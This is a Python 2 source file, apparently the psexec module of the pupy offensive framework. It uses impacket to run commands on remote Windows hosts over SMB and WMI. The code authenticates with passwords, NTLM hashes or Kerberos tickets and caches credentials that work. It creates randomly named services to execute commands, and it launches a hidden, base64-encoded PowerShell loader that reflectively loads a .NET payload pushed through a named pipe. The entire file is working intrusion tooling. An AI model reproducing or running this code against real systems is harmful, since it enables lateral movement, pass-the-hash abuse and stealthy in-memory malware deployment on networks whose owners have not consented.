#!/usr/bin/env python2

import time
import traceback
import random
import os
import string
import socket

try:
    import idna
    assert idna
except ImportError:
    pass

import encodings

from StringIO import StringIO
from base64 import b64encode
from hashlib import md5
from threading import Thread

from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import \
     RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
from impacket.system_errors import \
     ERROR_SERVICE_DOES_NOT_EXIST, ERROR_SERVICE_NOT_ACTIVE, \
     ERROR_SERVICE_REQUEST_TIMEOUT
from impacket.smbconnection import SMBConnection, SessionError, SMB_DIALECT
from impacket.smb3structs import FILE_WRITE_DATA, FILE_APPEND_DATA

from sys import getdefaultencoding

from Crypto.Cipher import DES
assert(DES)


SUCCESS_CACHE = {}
SMB_SESSIONS_CACHE = {}
WBEM_SESSIONS_CACHE = {}

USE_CACHE = False


class PsExecException(Exception):
    def as_unicode(self, codepage=None):
        try:
            if codepage:
                error = self.message.decode(codepage)
            else:
                error = self.message.decode(getdefaultencoding())

            return error

        except UnicodeError:
            return error.decode('latin1')

try:
    import pupy

    if not hasattr(pupy, 'creds_cache'):
        setattr(pupy, 'creds_cache', {})

    if 'psexec' not in pupy.creds_cache:
        pupy.creds_cache['psexec'] = {}

    SUCCESS_CACHE = pupy.creds_cache['psexec']
except ImportError:
    pass


# Use Start-Transcript -Path "C:\windows\temp\d.log" -Force; to debug

PIPE_LOADER_TEMPLATE = '''
$ps=new-object System.IO.Pipes.PipeSecurity;
$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
$p.WaitForConnection();
$x=new-object System.IO.BinaryReader($p);
$a=$x.ReadBytes({size});
$x.Close();
[Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
'''

PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand "{cmd}"'
POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

PERM_DIR       = ''.join(random.sample(string.ascii_letters, 10))
BATCH_FILENAME = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
SMBSERVER_DIR  = ''.join(random.sample(string.ascii_letters, 10))
SERVICE_NAME   = ''.join(random.sample(string.ascii_letters, 10))

if 'idna' not in encodings._cache or not encodings._cache['idna']:
    if 'idna' in encodings._cache:
        del encodings._cache['idna']

    try:
        import encodings.idna
    except ImportError:
        message = 'IDNA module was not loaded. Reload modules with:' + (
            '\n'.join([
                'load_package -f {}'.format(module) for module in (
                    'encodings.idna', 'pupyutils.psexec'
                )]))
        raise RuntimeError(message)

    encodings._cache['idna'] = encodings.idna.getregentry()


def generate_loader_cmd(size):
    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
    encoded = b64encode(PIPE_LOADER_TEMPLATE.format(
        pipename=pipename, size=size).encode('utf-16le'))
    cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
    return cmd, pipename


class ConnectionInfo(object):
    __slots__ = (
        'host', 'port', 'user', 'password', 'domain',
        'nt', 'lm',
        'aes', 'TGT', 'TGS', 'KDC', 'valid', 'timeout',
        '_smb_conn', '_wbem_conn', '_dcom_conn', '_use_cache', '_cached'
    )

    def __init__(self, host, port=445, user='', domain='', password='', ntlm='',
                 aes='', tgt='', tgs='', kdc='', timeout=10, use_cache=None):

        self._smb_conn = None
        self._wbem_conn = None
        self._dcom_conn = None
        self._cached = False

        if use_cache is None:
            use_cache = USE_CACHE

        self._use_cache = use_cache

        if type(host) == unicode:
            host = host.encode('utf-8')

        if type(user) == unicode:
            user = user.encode('utf-8')

        if type(password) == unicode:
            password = password.encode('utf-8')

        if type(domain) == unicode:
            domain = domain.encode('utf-8')

        cached_info = None

        if user:
            if domain:
                user_key = '{}\\{}'.format(user, domain)
            else:
                user_key = user

            cached_info = SUCCESS_CACHE.get(frozenset([host, port, user_key]))
        else:
            for known_auth in SUCCESS_CACHE.itervalues():
                if known_auth['host'] == host and known_auth['port'] == port:
                    cached_info = known_auth
                    break

        if cached_info:
            user = user or cached_info.get('user', '')
            domain = domain or cached_info.get('domain', '')
            password = password or cached_info.get('password', '')
            ntlm = ntlm or cached_info.get('ntlm', '')
            aes = aes or cached_info.get('aes', '')
            tgt = tgt or cached_info.get('tgt', '')
            tgs = tgt or cached_info.get('tgs', '')
            kdc = kdc or cached_info.get('kdc', '')

        self.host = host
        self.port = int(port)
        self.user = user
        self.password = password
        self.domain = domain
        self.lm, self.nt = '', ''
        self.valid = None
        self.timeout = int(timeout)
        self.aes = aes
        self.TGT = tgt
        self.TGS = tgs
        self.KDC = kdc

        if ntlm:
            if ':' in ntlm:
                self.lm, self.nt = ntlm.strip().split(':')
            else:
                self.lm = '00'*16
                self.nt = ntlm

    def __str__(self):
        conninfo = 'host={}:{} user={}'.format(self.host, self.port, self.user)
        if self.domain:
            conninfo += ' '+self.domain

        if self.password:
            conninfo += ' '+self.password

        if self.nt and self.lm:
            conninfo += ' ntlm={}:{}'.format(self.lm, self.nt)

        return conninfo

    @property
    def cached(self):
        return self._cached

    @property
    def kerberos(self):
        return bool(self.aes)

    @property
    def ntlm(self):
        return '{}:{}'.format(self.lm, self.nt)

    @property
    def credentials(self):
        return [
            self.user,
            self.password,
            self.domain,
            self.lm, self.nt,
            self.aes, self.TGT, self.TGS
        ]

    def close(self):
        if self._cached:
            # Leak connections if cache is used
            return

        if self._smb_conn:
            try:
                self._smb_conn.close()
            except Exception:
                pass

            self._smb_conn = None

        if self._wbem_conn:
            try:
                self._wbem_conn.RemRelease()
            except Exception:
                pass

            self._wbem_conn = None

        if self._dcom_conn:
            try:
                self._dcom_conn.disconnect()
            except Exception:
                pass

            self._dcom_conn = None

    def __enter__(self):
        pass

    def __exit__(self, *args):
        self.close()

    def _cache_key_entry(self):
        return (
          self.host, self.user, self.password,
          self.domain, self.lm, self.nt, self.aes,
          self.kerberos
        )

    def create_wbem(self, namespace='//./root/cimv2', rpc_auth_level=None):
        if self._wbem_conn:
            return self._wbem_conn

        key = None
        if self._use_cache:
            key = self._cache_key_entry()
            if key in WBEM_SESSIONS_CACHE:
                self._dcom_conn, self._wbem_conn = WBEM_SESSIONS_CACHE[key]
                self._cached = True
                return self._wbem_conn

        dcom = DCOMConnection(
            self.host, self.user, self.password, self.domain,
            self.lm, self.nt, self.aes, oxidResolver=True,
            doKerberos=self.kerberos
        )

        try:
            iInterface = dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
                )

            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)

            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)


            if rpc_auth_level == 'privacy':
                iWbemServices.get_dce_rpc().set_auth_level(
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

            elif rpc_auth_level == 'integrity':
                iWbemServices.get_dce_rpc().set_auth_level(
                    RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)

        except:
            dcom.disconnect()
            raise

        self._dcom_conn = dcom
        self._wbem_conn = iWbemServices

        if key is not None:
            WBEM_SESSIONS_CACHE[key] = self._dcom_conn, self._wbem_conn
            self._cached = True

        return self._wbem_conn

    def create_pipe_dce_rpc(self, pipe, dialect=SMB_DIALECT):
        rpc = None

        rpc_transport = transport.DCERPCTransportFactory(
            r'ncacn_np:{}[{}]'.format(self.host, pipe))
        rpc_transport.set_dport(self.port)
        rpc_transport.preferred_dialect(dialect)
        rpc_transport.set_credentials(
            self.user, self.password, self.domain,
            self.lm, self.nt, self.aes,
            self.TGT, self.TGS
        )

        if self._smb_conn:
            rpc_transport.set_smb_connection(self._smb_conn)
            rpc = rpc_transport.get_dce_rpc()
        else:
            key = None

            rpc = rpc_transport.get_dce_rpc()
            rpc.connect()

            if key and key in SMB_SESSIONS_CACHE:
                self._smb_conn = SMB_SESSIONS_CACHE[key]
                rpc_transport.set_smb_connection(self._smb_conn)
                self._cached = True
                return rpc_transport.get_dce_rpc()

            self._smb_conn = rpc_transport.get_smb_connection()

            if key is not None:
                SMB_SESSIONS_CACHE[key] = self._smb_conn
                self._cached = True

        return rpc

    def create_smb_connection(self):
        if self._smb_conn:
            return self._smb_conn

        key = None

        if self._use_cache:
            key = self._cache_key_entry()
            if key in SMB_SESSIONS_CACHE:
                self._smb_conn = SMB_SESSIONS_CACHE[key]
                self._cached = True
                return self._smb_conn

        try:
            smb = SMBConnection(self.host, self.host, None, self.port, timeout=self.timeout)

            if self.kerberos:
                smb.kerberos_login(
                    self.user, self.password,
                    self.domain, self.lm, self.nt,
                    self.aes, self.KDC, self.TGT, self.TGS)
            else:
                smb.login(self.user, self.password, self.domain, self.lm, self.nt)

            self.valid = True

            user_key = self.user
            if self.domain:
                user_key = self.domain + '\\' + self.user

            SUCCESS_CACHE[frozenset([self.host, self.port, user_key])] = {
                'host': self.host,
                'port': self.port,
                'user': self.user,
                'password': self.password,
                'domain': self.domain,
                'ntlm': self.ntlm,
                'aes': self.aes,
                'tgt': self.TGT,
                'tgs': self.TGS,
                'kdc': self.KDC
            }

            self._smb_conn = smb

            if key is not None:
                SMB_SESSIONS_CACHE[key] = self._smb_conn

            return smb

        except SessionError, e:
            raise PsExecException(e.getErrorString()[0])

        except (OSError, socket.error), e:
            raise PsExecException(e)

        except Exception, e:
            error = '{}: {}\n{}'.format(type(e).__name__, e, traceback.format_exc())
            raise PsExecException(error)


class FileTransfer(object):
    __slots__ = (
        '_exception', '_conn', '_cached'
    )

    def __init__(self, conn, cached=False):
        self._exception = None
        self._conn = conn
        self._cached = cached

    @property
    def error(self):
        if self.ok:
            return None

        te = type(self._exception)
        if te in (UnicodeEncodeError, UnicodeDecodeError):
            return 'Could not convert name to unicode. Use -c option to specify encoding'
        elif te == SessionError:
            error = self._exception.getErrorString()[1]
            if type(error) != unicode:
                error = error.decode(getdefaultencoding())
            return error
        else:
            return te.__name__ +": " + str(self._exception)

    @property
    def ok(self):
        return self._exception is None

    @property
    def info(self):
        return self._conn.getServerOS()

    def shares(self):
        self._exception = None

        try:
            return [
                x['shi1_netname'][:-1] for x in self._conn.listShares()
            ]

        except Exception, e:
            self._exception = e
            return []

    def ls(self, share, path):
        self._exception = None

        try:
            listing = []
            for f in self._conn.listPath(share, path):
                if f.get_longname() in ('.', '..'):
                    continue

                listing.append((
                    f.get_longname(), f.is_directory() > 0,
                    f.get_filesize(), time.ctime(float(f.get_mtime_epoch()))
                ))
            return listing

        except Exception, e:
            self._exception = e
            return []

    def rm(self, share, path):
        self._exception = None

        try:
            self._conn.deleteFile(share, path)
        except Exception, e:
            self._exception = e

    def mkdir(self, share, path):
        self._exception = None

        try:
            self._conn.createDirectory(share, path)
        except Exception, e:
            self._exception = e

    def rmdir(self, share, path):
        self._exception = None

        try:
            self._conn.deleteDirectory(share, path)
        except Exception, e:
            self._exception = e

    def get(self, share, remote, local):
        self._exception = None

        if not self.ok:
            raise ValueError('Connection was not established')

        try:
            if type(local) in (str, unicode):
                local = os.path.expandvars(local)
                local = os.path.expanduser(local)

                with open(local, 'w+b') as destination:
                    self._conn.getFile(
                        share,
                        remote,
                        destination.write
                    )
            else:
                self._conn.getFile(share, remote, local)

        except Exception, e:
            self._exception = e

    def put(self, local, share, remote):
        self._exception = None

        if not self.ok:
            raise ValueError('Connection was not established')

        try:
            if type(local) in (str, unicode):
                local = os.path.expandvars(local)
                local = os.path.expanduser(local)

                if not os.path.exists(local):
                    raise ValueError('Local file ({}) does not exists'.format(local))

                with open(local, 'rb') as source:
                    self._conn.putFile(
                        share,
                        remote,
                        source.read
                    )
            else:
                self._conn.putFile(share, remote, local)

        except Exception, e:
            self._exception = e

    def push_to_pipe(self, pipe, data, timeout=90):
        tid = self._conn.connectTree('IPC$')
        pipeReady = False

        for _ in xrange(timeout):
            try:
                self._conn.waitNamedPipe(tid, '\\' + pipe)
                pipeReady = True
                break

            except:
                time.sleep(1)
                pass

        if not pipeReady:
            self._conn.waitNamedPipe(tid, '\\' + pipe)

        fid = self._conn.openFile(
            tid, pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, shareMode=0)

        try:
            # Write by small chunks (1.4 KB)
            # Slow, but should work with crappy networks
            for offset in xrange(0, len(data), 1400):
                self._conn.writeNamedPipe(
                    tid, fid,
                    data[offset:offset+1400]
                )
        finally:
            self._conn.closeFile(tid, fid)

    def close(self):
        if self._conn and not self._cached:
            self._conn.close()


class ShellServiceAlreadyExists(Exception):
    pass


class ShellServiceIsNotExists(Exception):
    pass


class ShellService(object):
    __slots__ = (
        '_scHandle', '_serviceHandle', '_scmr', '_name'
    )

    def __init__(self, rpc, name=SERVICE_NAME):
        if type(name) == unicode:
            name = name.encode('latin1', errors='ignore')

        self._name = name + '\x00'

        self._scmr = rpc
        self._scmr.bind(scmr.MSRPC_UUID_SCMR)

        resp = scmr.hROpenSCManagerW(self._scmr)
        self._scHandle = resp['lpScHandle']

        self._serviceHandle = None

        try:
            resp = scmr.hROpenServiceW(self._scmr, self._scHandle, self._name)
            self._serviceHandle = resp['lpServiceHandle']

        except Exception, e:
            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_DOES_NOT_EXIST:
                pass
            else:
                raise

    def create(self, command, output=None):
        if self._serviceHandle:
            raise ShellServiceAlreadyExists()

        if output:
            command = ' & '.join([
                '%COMSPEC% /Q /c echo {} ^> {} 2^>^&1 > {}'.format(
                    command, output, BATCH_FILENAME),
                '%COMSPEC% /Q /c {}'.format(BATCH_FILENAME),
                'del {}'.format(BATCH_FILENAME)
            ])

        resp = scmr.hRCreateServiceW(
            self._scmr,
            self._scHandle,
            self._name,
            self._name,
            lpBinaryPathName=command
        )

        self._serviceHandle = resp['lpServiceHandle']
        return self._serviceHandle

    def start(self):
        if not self._serviceHandle:
            raise ShellServiceIsNotExists()

        try:
            scmr.hRStartServiceW(self._scmr, self._serviceHandle)
        except Exception, e:
            self.destroy()

            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_REQUEST_TIMEOUT:
                return False

            raise

        return self.status() == scmr.SERVICE_RUNNING

    def status(self):
        if not self._serviceHandle:
            raise ShellServiceIsNotExists()

        resp = scmr.hRQueryServiceStatus(self._scmr, self._serviceHandle)
        return resp['lpServiceStatus']['dwCurrentState']

    @property
    def exists(self):
        return self._serviceHandle is not None

    @property
    def active(self):
        return self.status() == scmr.SERVICE_RUNNING

    @property
    def stopped(self):
        return self.status() == scmr.SERVICE_STOPPED

    def destroy(self):
        if not self._serviceHandle:
            raise ShellServiceIsNotExists()

        try:
            scmr.hRControlService(self._scmr, self._serviceHandle, scmr.SERVICE_CONTROL_STOP)
        except Exception, e:
            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_NOT_ACTIVE:
                pass
            else:
                raise

        scmr.hRDeleteService(self._scmr, self._serviceHandle)
        scmr.hRCloseServiceHandle(self._scmr, self._serviceHandle)


def create_filetransfer(*args, **kwargs):
    try:
        info = ConnectionInfo(*args, **kwargs)
        smbc = info.create_smb_connection()
        return FileTransfer(smbc, info.cached), None

    except PsExecException as e:
        return None, e.as_unicode(kwargs.get('codepage', None))


def sc(conninfo, command, output=True):
    rpc = conninfo.create_pipe_dce_rpc(r'\pipe\svcctl')
    service = ShellService(rpc)
    if service.exists:
        service.destroy()

    output_filename = None
    if output:
        output_filename = '\\'.join([
            r'\Windows\Temp', ''.join(random.sample(string.ascii_letters, 10))
        ])

    if not service.create(command, output_filename):
        raise PsExecException('Could not create service')

    running = service.start()
    if running and conninfo.timeout:
        timeout = time.time() + conninfo.timeout

        while service.active:
            time.sleep(1)
            if timeout is not None and time.time() >= timeout:
                break

        service.destroy()

    return output_filename


def wmiexec(conninfo, command, share='C$', output=True):
    output_filename = None

    iWbemServices = conninfo.create_wbem()
    win32Process, _ = iWbemServices.GetObject('Win32_Process')
    if output:
        output_filename = '\\'.join([
            r'\Windows\Temp', ''.join(random.sample(string.ascii_letters, 10))
        ])

        command = r'cmd.exe /Q /c {} 2>&1 1> \\127.0.0.1\{}\{}'.format(
            command, share, output_filename
        )

    iResultClassObject = win32Process.Create(command, r'C:\Windows\Temp', None)
    result = iResultClassObject.ReturnValue
    if result == 0:
        return output_filename
    else:
        raise PsExecException('Win32_Process.Create failed: {}'.format(result))


def wql(
    host, port, user, domain, password, ntlm,
        query, timeout=30, namespace='//./root/cimv2', rpc_auth_level=None):

    conninfo = ConnectionInfo(
        host, port, user, domain, password, ntlm, timeout=timeout
    )

    with conninfo:
        iWbemServices = conninfo.create_wbem(namespace, rpc_auth_level)
        iEnumWbemClassObject = iWbemServices.ExecQuery(query.strip())

        first = True
        columns = None

        try:
            result = []
            while True:
                try:
                    pEnum = iEnumWbemClassObject.Next(0xffffffff,1)[0]
                    header = pEnum.getProperties()
                    if first:
                        columns = tuple(x for x in header)
                        first = False

                    item = [None]*len(columns)

                    for idx, key in enumerate(columns):
                        if type(header[key]['value']) is list:
                            item[idx] = tuple([
                                value for value in header[key]['value']
                            ])
                        else:
                            item[idx] = header[key]['value']

                    result.append(item)

                except Exception as e:
                    if str(e).find('S_FALSE') < 0:
                        raise
                    else:
                        break

            return columns, tuple(result)

        finally:
            iEnumWbemClassObject.RemRelease()


def check(host, port, user, domain, password, ntlm, timeout=30):
    conninfo = ConnectionInfo(
        host, port, user, domain, password, ntlm, timeout=timeout
    )

    try:
        with conninfo:
            conninfo.create_smb_connection()
    except:
        return False

    return True


def _smbexec(
    conninfo, command, share='C$', execm='smbexec',
        codepage=None, output=True, on_exec=None):

    filename = None
    ft = None
    smbc = None

    if execm == 'smbexec':
        filename = sc(conninfo, command, output)

    elif execm == 'wmi':
        filename = wmiexec(conninfo, command, share, output)

    else:
        raise ValueError('Unknown execution method, knowns are smbexec/wmi')

    if on_exec:
        if not smbc:
            smbc = conninfo.create_smb_connection()

        if not ft:
            ft = FileTransfer(smbc, cached=True)

        on_exec(ft)

    if filename:
        if not ft:
            if not smbc:
                smbc = conninfo.create_smb_connection()

            ft = FileTransfer(smbc, cached=True)

        buf = StringIO()
        for retry in xrange(5):
            ft.get(share, filename, buf.write)
            if not ft.ok and 'share access flags' in ft.error:
                time.sleep(retry)
                continue

            break

        if not ft.ok:
            return None, ft.error + ' (args: share={} filename={})'.format(
                share, filename)

        ft.rm(share, filename)
        value = buf.getvalue()

        if codepage:
            value = value.decode(codepage)

        return value, ft.error

    return None, None


def smbexec(
        host, port,
        user, domain,
        password, ntlm,
        command, share='C$', execm='smbexec',
        codepage=None, timeout=30, output=True, on_exec=None):

    conninfo = ConnectionInfo(
        host, port, user, domain, password, ntlm, timeout=timeout
    )

    with conninfo:
        try:
            return _smbexec(conninfo, command, share, execm, codepage, output, on_exec)

        except PsExecException as e:
            return None, e.as_unicode(codepage)

        except SessionError as e:
            return None, '{}:{} {}'.format(host, port, e)

        except Exception as e:
            return None, '{}:{} {}: {}\n{}'.format(
                host, port, type(e).__name__, e, traceback.format_exc())


def get_cache():
    if USE_CACHE is not True:
        raise ValueError('Cache disabled')

    keys = set()
    keys.update(tuple(x) for x in SMB_SESSIONS_CACHE)
    keys.update(tuple(x) for x in WBEM_SESSIONS_CACHE)

    return tuple(keys)


def clear_session_caches():
    for session in SMB_SESSIONS_CACHE.values():
        try:
            session.close()
        except Exception:
            pass

    for dcom, wbem in WBEM_SESSIONS_CACHE.values():
        try:
            wbem.RemRelease()
        except Exception:
            pass

        try:
            dcom.disconnect()
        except Exception:
            pass

    SMB_SESSIONS_CACHE.clear()
    WBEM_SESSIONS_CACHE.clear()


def set_use_cache(use_cache):
    global USE_CACHE
    USE_CACHE = use_cache

    if use_cache is False:
        clear_session_caches()


def pupy_smb_exec(
    host, port,
    user, domain,
    password, ntlm,
    payload,
    execm='smbexec',
    timeout=90, log_cb=None):

    size = len(payload)
    cmd, pipename = generate_loader_cmd(size)

    def _loader():
        if log_cb:
            log_cb(None, 'Thread started (pipe={}, payload={}, md5={})'.format(
                pipename, size, md5(payload).hexdigest()))

        def _push_payload(ft):
            if log_cb:
                log_cb(None, 'Connected to {}:{} (user={}, os={})'.format(
                    host, port, ((domain + '\\') if domain else '') + user,
                    ft.info))

            try:
                ft.push_to_pipe(pipename, payload, timeout=timeout)
                if log_cb:
                    log_cb(True, 'Payload flushed')

            except Exception, e:
                if log_cb:
                    log_cb(False, '{}: {}'.format(
                        e, traceback.format_exc()))

        try:
            _, error = smbexec(
                host, port,
                user, domain,
                password, ntlm,
                cmd, execm=execm,
                timeout=timeout,
                output=False,
                on_exec=_push_payload)

            if error:
                if log_cb:
                    log_cb(False, 'Smbexec failed: {})'.format(error))

        except Exception, e:
            if log_cb:
                log_cb(False, 'Communication failed: {})'.format(e))

    worker = Thread(
        target=_loader,
        name='PowerLoader [smb] (pipe={}, timeout={})'.format(
            pipename, timeout)
    )
    worker.daemon = True
    worker.start()

    return cmd, pipename
